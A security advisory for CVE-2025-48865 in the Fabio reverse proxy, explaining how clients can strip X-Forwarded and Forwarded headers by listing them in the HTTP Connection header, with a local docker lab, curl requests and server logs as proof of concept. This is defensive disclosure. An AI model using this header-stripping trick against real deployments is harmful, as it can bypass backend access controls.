# Fabio allows HTTP clients to manipulate custom headers it adds

**GHSA**: GHSA-q7p4-7xjv-j3wf | **CVE**: CVE-2025-48865 | **Severity**: critical (CVSS 9.1)

**CWE**: CWE-345, CWE-348

**Affected Packages**:
- **github.com/fabiolb/fabio** (go): <= 1.6.5

## Description

### Summary
Fabio allows clients to remove X-Forwarded headers (except X-Forwarded-For) due to a vulnerability in how it processes hop-by-hop headers.

Fabio adds HTTP headers like X-Forwarded-Host and X-Forwarded-Port when routing requests to backend applications. Since the receiving application should trust these headers, allowing HTTP clients to remove or modify them creates potential security vulnerabilities.

However, it was found that some of these custom headers can indeed be removed and, in certain cases, manipulated. The attack relies on the behavior that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:

```
Connection: close, X-Forwarded-Host
```

Similar critical vulnerabilities have been identified in other web servers and proxies, including [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813) in Apache HTTP Server and [CVE-2024-45410](https://github.com/advisories/GHSA-62c8-mh53-4cqv) in Traefik.

### Details
It was found that the following headers can be removed in this way (i.e. by specifying them within a connection header):
- X-Forwarded-Host
- X-Forwarded-Port
- X-Forwarded-Proto
- X-Real-Ip
- Forwarded

### PoC
The following docker-compose file was used for testing:
```yml
version: '3'
services:
  fabio:
    image: fabiolb/fabio
    ports:
      - "3000:9999"
      - "9998:9998"
    volumes:
      - ./fabio.properties:/etc/fabio/fabio.properties

  backend:
    build: .
    ports:
      - "8080:8080"
    environment:
      - PYTHONUNBUFFERED=1
```

The fabio.properties configuration:
```
proxy.addr = :9999
ui.addr = :9998
registry.backend = static
registry.static.routes = route add service / http://backend:8080/
```

A Python container runs a simple HTTP server that logs received headers.
The Dockerfile:
```dockerfile
FROM python:3.11-slim

WORKDIR /app

COPY app.py .

RUN pip install flask

EXPOSE 8080

CMD ["python", "app.py"]
```

Python Flask Server
```python
from flask import Flask, request
import sys
import os

sys.stdout.flush()
sys.stderr.flush()
os.environ['PYTHONUNBUFFERED'] = '1'

app = Flask(__name__)

@app.before_request
def log_request_info():
    print("HEADERS:")
    for header_name, header_value in request.headers:
        print(f"   {header_name}: {header_value}")

@app.route("/", methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def hello():
    return f"Hello, World! Method: {request.method}"

@app.route("/<path:path>", methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def catch_all(path):
    return f"Caught path: {path}, Method: {request.method}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
```

A normal HTTP request/response pair looks like this:
#### Request 
```http
GET / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: curl/8.7.1
Accept: */*
Connection: keep-alive
```

curl command
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept: */*' -H $'Connection: keep-alive' \
    $'http://127.0.0.1:3000/'
```
#### Response
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.12
Date: Thu, 22 May 2025 23:09:12 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 25
Connection: close

Hello, World! Method: GET
```

Server Log
```
backend-1  | HEADERS:
backend-1  |    Host: 127.0.0.1:3000
backend-1  |    User-Agent: curl/8.7.1
backend-1  |    Accept: */*
backend-1  |    Forwarded: for=192.168.65.1; proto=http; by=172.24.0.3; httpproto=http/1.1
backend-1  |    X-Forwarded-For: 192.168.65.1
backend-1  |    X-Forwarded-Host: 127.0.0.1:3000
backend-1  |    X-Forwarded-Port: 3000
backend-1  |    X-Forwarded-Proto: http
backend-1  |    X-Real-Ip: 192.168.65.1
```

Next, a request, where the Forwarded header is defined as a hop-by-hop header via the Connection header is sent:
#### Request
```http
GET / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: curl/8.7.1
Accept: */*
yeet: 123
Connection: keep-alive, Forwarded
```

curl command
```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept: */*' -H $'Connection: keep-alive, Forwarded' \
    $'http://127.0.0.1:3000/'
```
#### Response
```http
HTTP/1.1 200 OK
Content-Length: 25
Content-Type: text/html; charset=utf-8
Date: Thu, 22 May 2025 23:42:45 GMT
Server: Werkzeug/3.1.3 Python/3.11.12

Hello, World! Method: GET
```

Server Logs
```
backend-1  | HEADERS:
backend-1  |    Host: 127.0.0.1:3000
backend-1  |    User-Agent: curl/8.7.1
backend-1  |    Accept: */*
backend-1  |    X-Forwarded-For: 192.168.65.1
backend-1  |    X-Forwarded-Host: 127.0.0.1:3000
backend-1  |    X-Forwarded-Port: 3000
backend-1  |    X-Forwarded-Proto: http
backend-1  |    X-Real-Ip: 192.168.65.1
```

The response shows that Fabio's `Forwarded` header was removed from the request

### Impact
If the backend application trusts these custom headers for security-sensitive operations, their removal or modification may lead to vulnerabilities such as access control bypass.

This vulnerability has a critical severity rating similar to  [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813) (Apache HTTP Server, 9.8) and [CVE-2024-45410](https://github.com/advisories/GHSA-62c8-mh53-4cqv) (Traefik, 9.3)

Stripping headers like `X-Real-IP` can confuse the upstream server about whether the request is coming from an external client through the reverse proxy or from an internal source. This type of vulnerability can be exploited as demonstrated in: [Versa Concerto RCE](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce).

### References
-  [CVE-2024-45410](https://github.com/advisories/GHSA-62c8-mh53-4cqv) 
-  [CVE-2022-31813](https://nvd.nist.gov/vuln/detail/CVE-2022-31813)
- [Versa Concerto RCE](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce)
